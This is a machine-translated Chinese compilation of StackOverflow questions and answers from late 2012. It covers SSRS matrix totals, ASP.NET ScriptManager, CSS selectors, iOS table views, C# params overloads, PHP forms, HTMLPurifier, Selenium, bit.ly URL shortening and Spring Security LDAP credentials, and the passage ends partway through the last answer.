# StackOverflow 问答 14039000-14039999

# reporting-services - 汇总报告服务矩阵中的 2 列

> ID：14039003
> 
> 赞同：1
> 
> 时间：2012-12-26T10:06:34.110
> 
> 标签：reporting-services, matrix, ssrs-2008

我的报告中有矩阵，列字段为“层原点”。

层 Origin 有 3 个值：

1.  新生意
2.  更新 - 重写
3.  续订 - 相同条款

如果我按原样运行报告，它将显示上述 3 个中的每一个的总计。

我什么是显示总计：

1.  新生意
2.  续订（续订 - 重写 + 续订 - 相同条款）

即：我想总结 Renewal-Rewritten 和 Renewal-Same Terms 以下的值是说明我的请求的屏幕截图。

![在此处输入图像描述](../Images/fd3f57768e6cca00d79f29ca11d7e798.png)

* * *

感谢您的回复。我尝试了下面的代码，但它给了我错误（见下面的屏幕）

```
=SUM(IIF(Fields!Layer_Origin.Value="New Business",0,Fields!USD_Cedent_Premium.Value)) 
```

![在此处输入图像描述](../Images/fd3f57768e6cca00d79f29ca11d7e798.png)

感谢您的反馈。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-26T11:38:27.300

如果您只在 Total Column 中使用条件 SUM，则可以处理这种情况

```
=SUM(IIF(Fields!Layer_Origin.Value="New Business",0,Fields!USD_CED.Value)) 
```

而不是使用

```
=SUM(Fields!USD_CED.Value) 
```

我认为它会解决你的问题。如果有拼写错误或语法错误，请原谅我。因为我没有安装任何 VS 来检查。如果您仍然遇到任何问题，请分享，因为我绝对可以提供帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-26T15:31:01.077

经过多次测试，我发现了问题。代码应如下所示：

```
=SUM(IIF(Fields!Layer_Origin.Value="New Business",CDec(0.00),Fields!USD_Cedent_Premium.Value)) 
```

感谢你的协助

# javascript - ScriptManager 不可访问

> ID：14039009
> 
> 赞同：4
> 
> 时间：2012-12-26T10:07:34.023
> 
> 标签：javascript, asp.net, class, scriptmanager

我正在尝试从 .cs 类调用在 aspx 页面上实现的 js 函数。但是， ScriptManager 似乎不存在于 .cs 类中。基本上，.cs 文件是我在项目中使用的 dll 的一部分。我需要从 dll 中的 .cs 文件调用在 aspx 页面上实现的 js 函数。

从 aspx 页面成功调用了 js 函数，但是当我在 .cs 文件中尝试相同的代码时，它说

> ScriptManager 由于其保护级别而无法访问。

这是我正在尝试的代码

```
protected void MyMethod()
{
   ScriptManager.RegisterStartupScript(this, this.GetType(), "key", "jsfunction();", true);
} 
```

任何想法为什么相同的代码在 aspx 页面上成功运行但不是来自 .cs 类？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-26T10:17:16.247

ScriptManager.RegisterStartupScript 接受 Page 或 Control 作为第一个参数。确保将当前页面传递给 cs 方法

```
protected void MyMethod(Page page)
{
   ScriptManager.RegisterStartupScript(page, typeof(UpdatePanel), new Guid().ToString() , "jsfunction();", true);
} 
```

并使用以下命令从 aspx.cs 页面调用：

```
MyMethod(this.Page); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-28T16:51:47.423

好吧，为了克服上述问题，我只是尝试使用这段代码

```
System.Web.UI.ScriptManager.RegisterStartupScript(this, this.GetType(), "key", "jsfunction();", true); 
```

注意 ScriptManager 使用完整的命名空间。

# css - 如何在 CSS 中引用子元素

> ID：14039010
> 
> 赞同：0
> 
> 时间：2012-12-26T10:07:42.803
> 
> 标签：css

我不确定这是否可能，但我想我会问。我不想为我在父项下的所有元素提供 id，我想知道在 CSS 中是否可以引用它们中的每一个而不给它们一个 id。

如果我有：

```
 <td id="bracket-wrapper-lt">
    <div id="bracket-top-lt"></div>
    <div id="bracket-middle-lt"></div>
    <div id="bracket-bottom-lt"></div>
  </td> 
```

我可以访问下面`bracket-wrapper-lt`给我的三个 div

```
 <td id="bracket-wrapper-lt">
    <div></div>
    <div></div>
    <div></div>
  </td> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-26T10:09:19.797

你可以，使用`:nth-child(<number>)`css。

有关详细信息，请参阅[http://css-tricks.com/how-nth-child-works/](http://css-tricks.com/how-nth-child-works/)。

您的代码示例：

```
 <td id="bracket-wrapper-lt">
    <div></div>
    <div></div>
    <div></div>
  </td> 
```

CSS：

```
td#bracket-wrapper-lt div:nth-child(1) {
    color: red;
} 
```

以上会将您的第一个 div 中的文本着色为红色。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-26T10:11:05.103

是的，您可以使用以下方式访问它：

```
#bracket-wrapper-lt div 
```

匹配所有后代（具有指定的标签、类等）和

```
#brakect-wrapper-lt > div 
```

匹配所有子项（具有指定的标签、类等）

[你可以在这里](http://www.w3.org/TR/CSS2/selector.html)阅读更多关于它的信息

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-26T10:23:27.450

对于跨浏览器支持，您还可以使用：

```
#bracket-wrapper-lt > div:first-child { /*Style goes here*/ }
#bracket-wrapper-lt > div:first-child + div { /*Style goes here*/ }
#bracket-wrapper-lt > div:first-child + div + div { /*Style goes here*/ } 
```

演示：http: [//jsfiddle.net/sfEDk/](http://jsfiddle.net/sfEDk/)

它适用于 IE(>=7)、Firefox、Chrome、Safari 和 Opera

# iphone - Tableview 没有显示正确的数据

> ID：14039013
> 
> 赞同：0
> 
> 时间：2012-12-26T10:08:23.987
> 
> 标签：iphone, objective-c, ios, tableview, uisearchbar

我正在尝试实现一个带有搜索功能的表格视图。我有一个函数可以查看每个项目的第一个字母。然后对于每个唯一的字母，它将它添加到另一个数组中。因此，如果它们是内部以 'S' 开头的项目，它只会添加一次字母 'S' 。

然后使用这个数组，我将构建我的部分和 rowsForSections。

```
- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section
{
    int rows = 0;
    if (tableView == self.searchDisplayController.searchResultsTableView)
    {
        //---get the letter in each section; e.g., A, B, C, etc.---
        NSString *alphabet = [firstIndex objectAtIndex:section];
        //---get all states beginning with the letter---
        NSPredicate *predicate = [NSPredicate predicateWithFormat:@"SELF.name beginswith[c] %@", alphabet];
        NSArray *names = [self.filteredListContent filteredArrayUsingPredicate:predicate];
        //---return the number of states beginning with the letter---
        rows =  [names count];
    }
    else
    {
        //---get the letter in each section; e.g., A, B, C, etc.---
        NSString *alphabet = [firstIndex objectAtIndex:section];
        //---get all states beginning with the letter---
        NSPredicate *predicate = [NSPredicate predicateWithFormat:@"SELF.name beginswith[c] %@", alphabet];
        NSArray *names = [self.listContent filteredArrayUsingPredicate:predicate];
        //---return the number of states beginning with the letter---
        rows =  [names count];
    }
    return rows;
}

- (NSInteger)numberOfSectionsInTableView:(UITableView *)tableView {

    int rows = 0;
    if (tableView == self.searchDisplayController.searchResultsTableView)
    {
        rows = [filteredFirstIndex count];
    }
    else
    {
        rows =  [firstIndex count];
    }
    return rows;
} 
```

这是我的 CellForRowAtIndex

```
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
{
    NSLog(@"list content %@",[listContent valueForKey:@"name"]);
    static NSString *kCellID = @"cellID";

    UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:kCellID];
    if (cell == nil)
    {
        cell = [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:kCellID];
        cell.accessoryType = UITableViewCellAccessoryDisclosureIndicator;
    }

    /*
     If the requesting table view is the search display controller's table view, configure the cell using the filtered content, otherwise use the main list.
     */
    Contact *contact = nil;
    if (tableView == self.searchDisplayController.searchResultsTableView)
    {
        contact = [self.filteredListContent objectAtIndex:indexPath.row];
    }
    else
    {
        contact = [self.listContent objectAtIndex:indexPath.row];
    }

    cell.textLabel.text = contact.name;
    return cell;
} 
```

**问题** 这是我的问题的屏幕截图。因为一张图片可以说超过 1000 个单词。

![在此处输入图像描述](../Images/3aa04d7e813451b78bff967b3020e1de.png)

希望任何人都可以帮助我！

亲切的问候！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-26T10:39:58.093

这些行提出了问题：

```
 contact = [self.filteredListContent objectAtIndex:indexPath.row];

    contact = [self.listContent objectAtIndex:indexPath.row]; 
```

因为您在部分中显示名称。

**在每个部分中，`indexPath.row`值从 0 开始。**

这就是为什么你会得到这个结果。

以下不是一个好的解决方案。但举个例子，我发布它。（这会导致性能问题）在你的`cellForRowAtIndexPath`：

```
NSString *alphabet = [firstIndex objectAtIndex:indexPath.section];
NSPredicate *predicate = [NSPredicate predicateWithFormat:@"SELF.name beginswith[c] %@", alphabet];
NSArray *names = [self.filteredListContent filteredArrayUsingPredicate:predicate];
contact = [names objectAtIndex:indexPath.row]; 
```

# c# - 带有“params”关键字的方法的几个重载

> ID：14039014
> 
> 赞同：5
> 
> 时间：2012-12-26T10:08:37.097
> 
> 标签：c#, .net, overloading, params-keyword

我看过[`Path.Combine`](http://msdn.microsoft.com/en-us/library/dd781134.aspx)并注意到它有四个重载：

1.  `string`,`string`
2.  `string`, `string`,`string`
3.  `string`, `string`, `string`,`string`
4.  `params string[]`

前三个重载有什么用？
在我看来，第四个重载使其他重载毫无意义。我查看了源代码，确实发现第四个重载的实现有点不同，但即使在这种情况下，我也希望只有一个`params`重载根据数组的长度决定使用哪个实现。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-26T10:37:55.967

根据这个答案，[https://stackoverflow.com/a/2796763/385844](https://stackoverflow.com/a/2796763/385844)，这是为了避免创建参数数组的开销，并且因为非参数重载对于不支持可变长度的语言的用户来说很方便参数列表。

也可以看看

[为什么 string.Format 有几种风格？](https://stackoverflow.com/questions/1252432/why-does-string-format-come-in-several-flavors)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-26T10:22:29.693

正如 Oded 所说，我发现它一定是为了向后兼容，因为我在 2.0、3.5 中找不到它

*   [Path.Combine 2.0](http://msdn.microsoft.com/en-US/library/fyy7a5kt%28v=vs.80%29.aspx)
*   [Path.Combine 3.5](http://msdn.microsoft.com/en-US/library/fyy7a5kt%28v=vs.90%29.aspx)

我认为重载始于 4.0

*   [Path.Combine 4.0](http://msdn.microsoft.com/en-US/library/fyy7a5kt%28v=vs.100%29.aspx) - 如果您查看正确的导航，您会看到重载

至于其他许多重载，我不会代表 .net 团队发言，但我觉得他们觉得每次增加重载都是没有意义的，所以他们停在 4 处并为超过 4 个字符串组合提供了一个字符串数组 - 我认为是明智的

我的解释基于 Lambda 表达式，团队在 16 个参数处停止

[行动（T1，T2，T3，T4，T5，T6，T7，T8，T9，T10，T11，T12，T13，T14，T15，T16）](http://msdn.microsoft.com/en-us/library/dd402872.aspx)

Path.Combine 本来可以这样，但毫无意义。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-26T10:44:12.317

我只能从我与其他 C# 开发人员的经验谈起。

并非所有开发人员都熟悉或熟悉`params`语法（技术名称是*可变参数函数*这一事实也无济于事）。
我知道我不得不一遍又一遍地解释它，所以看到电话并不罕见

```
instance.ParamsMethod(new int[]{1});
//or even
instance.ParamsMethod(new List<int>{1}.ToArray()); 
```

对于写成的方法：

公共无效参数方法（参数 int [] 源）{}

`params`否定（然后是一些）的所有甜蜜句法糖。

所以，我个人的偏好是提供 1 和 2 参数的情况作为重载，因为这在某种程度上使得不必要地混乱代码变得更加困难。由于重载链接，调用稍微慢了一点，但它有助于使代码更清晰。

# php - PHP 和 HTML 选择标签

> ID：14039015
> 
> 赞同：0
> 
> 时间：2012-12-26T10:08:39.993
> 
> 标签：php, html, tags

我从 PHP 和 HTML 开始，想用三个下拉列表（选择标签）执行简单的代码。但是当我从一个中进行选择时，其他两个选定的值就会消失。我应该在提交时保存值然后回显吗？如果是，我该怎么做。示例代码将不胜感激。

```
 <?php // formtest_2.php 

$name_vid = $name_type = $name_model = "";

if (isset($_POST['vid']))$name_vid=($_POST['vid']);
else $name_vid="no";

if (isset($_POST['type']))$name_type=sanitizeString($_POST['type']);
else $name_type="no";

if (isset($_POST['model']))$name_model=sanitizeString($_POST['model']);
else $name_model="no";

echo <<<_END
<html>
    <head>
        <title>Form Test Two</title>
    </head>
    <body>

    Make your selection:

<form action="formtest_2.php" method="post">

    <select name="vid" size="1">

    <option value="" selected>Product</option>

    <option value = "apple">apple</option>
    <option value = "cherry">cherry</option>
    <option value = "orange">orange</option>

    </select>

<input type="submit"/><br />        

    <select name="type" size="1">

    <option value="" selected>Color</option>

    <option value = "green">green</option>
    <option value = "red">red</option>
    <option value = "orange">orange</option>

    </select>

<input type="submit"/><br />        

    <select name="model" size="1">

    <option value="" selected>Model</option>

    <option value = "1-a">1-a</option>
    <option value = "2-b">2-b</option>
    <option value = "3-c">3-c</option>

    </select>

<input type="submit"/><br />

    </form>
    </body>
</html>
_END;

echo "Your selection is: $name_vid and $name_type and $name_model"; 

function sanitizeString($var)
{
    $var = stripslashes($var);
    $var = htmlentities($var);
    $var = strip_tags($var);

    return $var;
}
?> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-26T10:26:13.753

我认为您需要在提交后重新选择下拉列表的值。以下代码将是一个修复。

```
<?php // formtest_2.php 
$name_vid = $name_type = $name_model = "(nothing)";

if (isset($_POST['vid']) && $_POST['vid']) $name_vid=($_POST['vid']);

if (isset($_POST['type']) && $_POST['type']) $name_type=sanitizeString($_POST['type']);

if (isset($_POST['model']) && $_POST['model']) $name_model=sanitizeString($_POST['model']); 
?>
<html>
    <head>
        <title>Form Test Two</title>
    </head>
    <body>

    Make your selection:
    <form action="formtest_2.php" method="post">
        <select name="vid" size="1">    
            <option value="">Product</option>        
            <option value = "apple" <?php if($name_vid == 'apple') echo 'selected="selected"'; ?>>apple</option>
            <option value = "cherry" <?php if($name_vid == 'cherry') echo 'selected="selected"'; ?>>cherry</option>
            <option value = "orange" <?php if($name_vid == 'orange') echo 'selected="selected"'; ?>>orange</option>    
        </select>

        <br />

        <select name="type" size="1">
            <option value="">Color</option>    
            <option value = "green" <?php if($name_type == 'green') echo 'selected="selected"'; ?>>green</option>
            <option value = "red" <?php if($name_type == 'red') echo 'selected="selected"'; ?>>red</option>
            <option value = "orange" <?php if($name_type == 'orange') echo 'selected="selected"'; ?>>orange</option>    
        </select>

        <br />        

        <select name="model" size="1">    
            <option value="">Model</option>    
            <option value = "1-a" <?php if($name_model == '1-a') echo 'selected="selected"'; ?>>1-a</option>
            <option value = "2-b" <?php if($name_model == '2-b') echo 'selected="selected"'; ?>>2-b</option>
            <option value = "3-c" <?php if($name_model == '3-c') echo 'selected="selected"'; ?>>3-c</option>    
        </select>

        <input type="submit"/><br />
    </form>
    </body>
</html>
<?php
echo "Your selection is: $name_vid and $name_type and $name_model"; 

function sanitizeString($var)
{
    $var = stripslashes($var);
    $var = htmlentities($var);
    $var = strip_tags($var);

    return $var;
}
?> 
```

我不会使用[heredoc](http://php.net/manual/en/language.types.string.php#language.types.string.syntax.heredoc)语法 ("<<<") 来打印 HTML。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-26T10:54:43.027

试试这个，我做了一个提交按钮，并在提交后重新选择了值：

```
<?php
// formtest_2.php

$name_vid = $name_type = $name_model = "";

if (isset($_POST['vid']))
    $name_vid = ($_POST['vid']);
else
    $name_vid = "no";

if (isset($_POST['type']))
    $name_type = sanitizeString($_POST['type']);
else
    $name_type = "no";

if (isset($_POST['model']))
    $name_model = sanitizeString($_POST['model']);
else
    $name_model = "no";

///////////////////
if($name_vid == 'apple')
{
    $v1 = 'selected';
}
elseif($name_vid == 'cherry')
{
    $v2 = 'selected';
}
elseif($name_vid == 'orange')
{
    $v3='selected';
}
 ////////////////////////
if($name_type == 'green')
{
    $t1 = 'selected';
}
elseif($name_type == 'red')
{
    $t2 = 'selected';
}
elseif($name_type == 'orange')
{
    $t3='selected';
}

///////////////////////
if($name_model == '1-a')
{
    $m1 = 'selected';
}
elseif($name_model == '2-b')
{
    $m2 = 'selected';
}
elseif($name_model == '3-c')
{
    $m3='selected';
}

?>
<html>
    <head>
        <title>Form Test Two</title>
    </head>
    <body>

        Make your selection:

        <form name="fruite_form" action="formtest_2.php" method="post">

            <select name="vid" size="1">

                <option value="" selected>Product</option>

                <option <?=$v1?> value = "apple">apple</option>
                <option <?=$v2?> value = "cherry">cherry</option>
                <option <?=$v3?> value = "orange">orange</option>

            </select>

            <select name="type" size="1">

                <option value="" selected>Color</option>

                <option <?=$t1?> value = "green">green</option>
                <option <?=$t2?>value = "red">red</option>
                <option <?=$t3?>value = "orange">orange</option>

            </select>

            <select name="model" size="1">

                <option value="" selected>Model</option>

                <option <?=$m1?> value = "1-a">1-a</option>
                <option <?=$m2?>value = "2-b">2-b</option>
                <option <?=$m3?>value = "3-c">3-c</option>

            </select>

            <input name="submitButtom" id="submitButton" type="submit"/><br />

        </form>
    </body>
</html>

<?
echo "Your selection is: $name_vid and $name_type and $name_model";

function sanitizeString($var)
{
    $var = stripslashes($var);
    $var = htmlentities($var);
    $var = strip_tags($var);

    return $var;
}
?> 
```

随意顶部添加您的提交按钮。但是给每个人一个唯一的名字，也不要忘记给你的表单命名，作为一个好的做法，也给一个 ID，它与 name 属性相同。

**更新：**只是为了确保您确实收到了帖子，因为这是您最初的问题，请在代码末尾打印此内容

```
echo $_POST['vid'] . ' ' . $_POST['type'] . ' ' . $_POST['model'] . '<br/><br/>'; 
```

并查看 post 提交后是否真的持有该值，如果您从 post 中获得值，而不是从分配的变量中获得值，则检查您在顶部使用的条件以分配您的值。

// 您需要检查 post isset 是否有实际值，只有这样，才应该分配变量。就像司徒说的一样。

# php - 在php的用户输入中插入某些标签属性

> ID：14039017
> 
> 赞同：2
> 
> 时间：2012-12-26T10:08:46.113
> 
> 标签：php, html, anchor

我将帖子作为用户的输入。用户可以`<a href=""></a>`在帖子中输入标签。我需要做的是，如果任何用户输入任何`<a>`标签，那么我必须插入一个类`<a class="user" href=""></a>`并保存到数据库。

我怎样才能做到这一点？我正在使用删除除用户输入之外的`strip_tags()`所有标签。`<a>`

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-26T10:24:28.420

您可以使用正则表达式来做到这一点，但很难找到一个**始终**有效的好方法。[看到这个线程](https://stackoverflow.com/questions/1732348/regex-match-open-tags-except-xhtml-self-contained-tags)。

您可以使用的是[HTMLPurifier](http://htmlpurifier.org/)。我用它来清理所有发布的信息。您可以选择要保留的标签、要为每个标签保留的属性等..

> 防止 XSS 并确保符合标准的输出的 HTML 过滤器。

您可以使用 HTMLPurifier 做的一件事是扩展核心代码，然后对于给定的标签，扩展类以为每个实体添加一个类。

您可以查看用户想要转换的这个[（快速）示例：](http://htmlpurifier.org/phorum/read.php?3,6541,6552)

```
<p>This is a paragraph</p>
<p>Another one</p> 
```

进入这个：

```
<p class="myclass">This is a paragraph</p>
<p class="myclass">Another one</p> 
```

**编辑：**

这是一个快速而肮脏的示例，您可以自己测试：

```
<?php

require_once 'lib/library/HTMLPurifier.auto.php';

class HTMLPurifier_AttrTransform_AnchorClass extends HTMLPurifier_AttrTransform
{
    public function transform($attr, $config, $context)
    {
      // keep predefined class
      if (isset($attr['class']))
      {
        $attr['class'] .= ' myclass';
      }
      else
      {
        $attr['class'] = 'myclass';
      }

      return $attr;
    }
}

$dirty_html = '<p><a href=""></a>
<a target="_blank" href=""></a>
<a href="" class="toto"></a>
<a href="" style="oops"></a></p>';

$options = array(
  'HTML' => array(
    'Allowed' => 'a[href|target|class]')
);
$config     = HTMLPurifier_Config::create($options);
$htmlDef    = $config->getHTMLDefinition(true);

$anchor     = $htmlDef->addBlankElement('a');
$anchor->attr_transform_post[] = new HTMLPurifier_AttrTransform_AnchorClass();

$purifier   = new HTMLPurifier($config);

$clean_html = $purifier->purify($dirty_html);

var_dump($clean_html); 
```

它输出：

```
string '<a href="" class="myclass"></a>

<a href="" class="myclass"></a>

<a href="" class="toto myclass"></a>

<a href="" class="myclass"></a>' (length=135) 
```

我使用自定义配置将一些属性保留在`<a>`标签中，这就是它删除`style`但不删除的原因`target`。您可以查看相关[文档](http://htmlpurifier.org/live/configdoc/plain.html)。

# foxpro - Clipper 语言中的 SQL 插入查询

> ID：14039023
> 
> 赞同：0
> 
> 时间：2012-12-26T10:09:35.737
> 
> 标签：foxpro, dbase, clipper, xbase

我有一个裁剪程序，其中有许多 DBF 文件来处理插入的数据。

我可以将 DBF 转换为 SQL。

现在我的疑问是在转换后我应该如何在我的裁剪器语言中使用 INSERT 查询，以便我应该能够将用户输入数据插入到我的 SQL 数据库中？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-19T22:08:39.663

基本上你需要可以处理 SQL 数据库的 Clipper RDD。

看看[中介](http://www.otc.pl/index.asp?s=76&l=2)

# selenium - Selenium IDE：如何通过 verifySelectOptions 命令验证 radComboBox 中是否仅存在特定值

> ID：14039028
> 
> 赞同：1
> 
> 时间：2012-12-26T10:09:49.717
> 
> 标签：selenium, telerik, selenium-ide, radcombobox

我们用来`Telerik RadComboBox`在我们的 Web 应用程序中实现一个下拉列表。是否可以仅在下拉列表中存在特定值时使用该`Selenium`命令进行验证？`verifySelectOptions`

我正在尝试使用它，但收到以下错误消息：

```
[error] Unexpected Exception: fileName -> chrome://selenium-ide/content/selenium-core/scripts/selenium-api.js, lineNumber -> 1688, columnNumber -> 20 
```

有没有人成功地使用`verifySelectOptions`命令来验证下拉列表的`RadComboBox`控制？

PS：我的目的是验证下拉列表是否显示为已定义列表，而不是显示为未定义列表。

谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-26T18:31:21.757

您收到该错误是因为您的 Selenium IDE 似乎没有正确设置。

但就手头的问题而言 -`verifySelectOptions`不会起作用，因为 RadComboBox 不是您的典型下拉菜单。

`verifySelectOptions`扫描 a`<select>`的选项，然后比较该选择中的后续`<option>`'s。

RadComboBox 是一个自定义控件，看起来像一个组合框，并且（从我目前所见）是一个`<table>`.

*所以进入解决方案......*
从这里的快速高峰，我可以看到 RadComboBox 有一些核心基础。首先，在 HTML 层次结构中，有一个`<input id="someIDHere...">`

我们可以将此 ID 用于第二个基础。

第二，在`<form>` 你的盒子下面，有一个具有相同 ID 的 div，但不是以 结尾，而是以`<input id="someIDHere_..._Input">`结尾`<div id="SAMEIDHERE_<samestuffhere>_DropDown">`。所以你的目标是找到那些 ID，然后找到那个列表。有了这些，你就可以进城了……

**使用 Selenium IDE...**
在您的 IDE 上，您可以使用选择器来简单地确保选项存在。例如 - 请 ![](../Images/8d707db1af7cfb0d1c2fab694dce3763.png)
注意我所说的关于 ID 的内容。

此外，如果您查看下拉列表本身 - 这就是您检索 ID 的方式。（注意它以 _Input 而不是 _DropDown 结尾）

![](../Images/fafaa2a8086a615f54b112a163ff0986.png)

您无法阅读 IDE，所以我将向您展示您应该拥有的选择器。 只需使用 IDE命令`css=div#<THE_ID>_DropDown ul > li[innerHTML='<whatever the text should be>']` 验证这些元素是否存在。`verifyElementPresent`

# iphone - 使用 bit.ly 缩短网址

> ID：14039033
> 
> 赞同：2
> 
> 时间：2012-12-26T10:10:03.277
> 
> 标签：iphone, objective-c, xcode, url, ios6

我曾尝试使用 bit.ly 缩短网址。当我尝试传递静态链接时，它会给我一个缩短的 url，但是当我尝试传递变量链接时它不会。这是我的代码....

```
Bitlyzer *bitlyzer = [[Bitlyzer alloc] initWithDelegate:self];

[bitlyzer shortURL:string];

[bitlyzer shortURL:@"http://www.google.com"]; 
```

当我传递这个 url 时，它给了我一个 Shorten url，但是当我传递一个如上所示的变量字符串时，它并没有给我缩短 url。

请给我你的建议...

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-26T10:15:30.823

有时在我们的字符串中保留了一些空间，因此有点不转换它并返回空值，所以首先从字符串中删除空值或空格，然后尝试转换它..

在您的文件中添加我的这两种方法，`.m` 然后与您的变量一起使用。请参阅示例以及如何使用它...

```
-(NSString*) trimString:(NSString *)theString {

     NSString *theStringTrimmed = [theString stringByTrimmingCharactersInSet: [NSCharacterSet whitespaceAndNewlineCharacterSet]];
     return theStringTrimmed;
}

-(NSString *) removeNull:(NSString *) string {    

     NSRange range = [string rangeOfString:@"null"];
    //NSLog(@"in removeNull : %d  >>>> %@",range.length, string);
    if (range.length > 0 || string == nil) {
           string = @"";
    }
    string = [self trimString:string];
   return string;
} 
```

并像下面这样使用...

```
 string = [self removeNull:string];
    [string retain];

    Bitlyzer *bitlyzer = [[Bitlyzer alloc] initWithDelegate:self];
    [bitlyzer shortURL:string]; 
```

# authentication - 将 JAAS 用于具有 Spring 安全性的 LDAP 密码

> ID：14039038
> 
> 赞同：4
> 
> 时间：2012-12-26T10:10:48.333
> 
> 标签：authentication, spring-security, ldap, websphere, jaas

我有一个使用 LDAP 身份验证的 Java EE Web 应用程序。我使用 Spring 安全性通过以下代码连接到我的 LDAP：

```
<bean id="ldapContextSource" class="com.myapp.security.authentication.MySecurityContextSource">
    <constructor-arg index="0" value="${ldap.url}" />
    <constructor-arg index="1" ref="userConnexion" />
</bean>

<security:authentication-manager alias="authenticationManager">
<security:authentication-provider ref="ldapAuthProvider" />
</security:authentication-manager>

<bean id="userConnexion" class="com.myapp.util.security.WebsphereCredentials">
    <constructor-arg value="${ldap.authJndiAlias}" />
</bean>

<bean id="ldapAuthProvider" class="org.springframework.security.ldap.authentication.LdapAuthenticationProvider">
    <constructor-arg>
        <bean class="org.springframework.security.ldap.authentication.BindAuthenticator">
            <constructor-arg ref="ldapContextSource" />
            <property name="userSearch" ref="userSearch" />
        </bean>
    </constructor-arg>
    <constructor-arg>
        <bean class="com.myapp.security.authentication.MyAuthoritiesPopulator" >
            <property name="userService" ref="userService" />
        </bean>
    </constructor-arg>
    <property name="userDetailsContextMapper" ref="myUserDetailsContextMapper"/>
    <property name="hideUserNotFoundExceptions" value="false" />
</bean> 
```

实际上，我的 bean在此响应中`WebsphereCredentials`使用 WebSphere 私有类： [How to access authentication alias from EJB deploy to Websphere 6.1](https://stackoverflow.com/questions/4663534/how-to-access-authentication-alias-from-ejb-deployed-to-websphere-6-1)`WSMappingCallbackHandlerFactory`

我们可以在官方的 websphere 文档中看到：[http://pic.dhe.ibm.com/infocenter/wasinfo/v6r1/index.jsp?topic=%2Fcom.ibm.websphere.express.doc%2Finfo%2Fexp%2Fae %2Frsec_pluginj2c.html](http://pic.dhe.ibm.com/infocenter/wasinfo/v6r1/index.jsp?topic=%2Fcom.ibm.websphere.express.doc%2Finfo%2Fexp%2Fae%2Frsec_pluginj2c.html)

但我不想要它，因为：

1.  我认为我的应用程序可以访问我的 WebSphere 实例中的所有 JAAS 登录（不确定）。
2.  此类定义在巨大的 IBM 客户端库 com.ibm.ws.admin.client-7.0.0.jar (42 Mo) => 编译速度较慢，在我的企业关系中不存在
3.  它不是便携式的，不是标准的

有关信息，我将`WebsphereCredentials`构造函数定义为：

```
Map<String, String> map = new HashMap<String, String>();

map.put(Constants.MAPPING_ALIAS, this.jndiAlias);
Subject subject;
try {
    CallbackHandler callbackHandler = WSMappingCallbackHandlerFactory.getInstance().getCallbackHandler(map, null);
    LoginContext lc = new LoginContext("DefaultPrincipalMapping", callbackHandler);
    lc.login();
    subject = lc.getSubject();
} catch (NotImplementedException e) {
    throw new EfritTechnicalException(EfritTechnicalExceptionEnum.LOGIN_CREDENTIAL_PROBLEM, e);
} catch (LoginException e) {
    throw new EfritTechnicalException(EfritTechnicalExceptionEnum.LOGIN_CREDENTIAL_PROBLEM, e);
}

PasswordCredential cred = (PasswordCredential) subject.getPrivateCredentials().toArray()[0];

this.user = cred.getUserName();
this.password = String.valueOf(cred.getPassword()); 
```

有没有办法只使用 Spring 安全性并删除这种依赖关系？

我不知道如何结合[http://static.springsource.org/spring-security/site/docs/3.1.x/reference/jaas.html](http://static.springsource.org/spring-security/site/docs/3.1.x/reference/jaas.html)和[http://static.springsource.org/spring-security/site /docs/3.1.x/reference/ldap.html](http://static.springsource.org/spring-security/site/docs/3.1.x/reference/ldap.html)。

也许我必须完全改变我的方法并使用另一种方式？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-27T20:24:15.680

我假设您的目标是简单地使用您在 WebSphere 中配置的用户名/密码来连接到 LDAP 目录？如果是这种情况，您并没有真正尝试结合 LDAP 和基于 JAAS 的身份验证。JAAS 支持实际上旨在成为一种使用 JAAS`LoginModule`对用户进行身份验证的方式，而不是使用基于 LDAP 的身份验证。

如果您想获得用户名和密码而不依赖于 WebSphere 的编译时，您有几个选择。

# 消除对 WAS 的编译时间和运行时依赖性

一种选择是以不同的方式配置密码。这可以像直接在配置文件中直接使用密码一样简单，如[Spring Security LDAP 文档](http://static.springsource.org/spring-security/site/docs/3.1.x/reference/ldap.html)中所示：

```
<bean id="ldapContextSource"
        class="org.springframework.security.ldap.DefaultSpringSecurityContextSource">
  <constructor-arg value="ldap://monkeymachine:389/dc=springframework,dc=org"/>
  <property name="userDn" value="cn=manager,dc=springframework,dc=org"/>
  <property name="password" value="password"/>
</bean> 
```

您还可以在 JNDI 中配置用户名密码。另一种选择是使用带有属性的 .properties 文件。如果您想确保密码是安全的，那么您可能需要使用[Jasypt](http://www.jasypt.org/spring31.html)之类的东西来加密密码。

# 消除编译时依赖并仍然使用 WAS 进行配置

如果您需要或想要使用 WebSphere 的 J2C 支持来存储凭证，那么您可以通过注入`CallbackHandler`实例来实现。例如，您的`WebsphereCredentials`bean 可能是这样的：

```
try {
    LoginContext lc = new LoginContext("DefaultPrincipalMapping", this.callbackHandler);
    lc.login();
    subject = lc.getSubject();
} catch (NotImplementedException e) {
    throw new EfritTechnicalException(EfritTechnicalExceptionEnum.LOGIN_CREDENTIAL_PROBLEM, e);
} catch (LoginException e) {
    throw new EfritTechnicalException(EfritTechnicalExceptionEnum.LOGIN_CREDENTIAL_PROBLEM, e);
}

PasswordCredential cred = (PasswordCredential) subject.getPrivateCredentials().toArray()[0];

this.user = cred.getUserName();
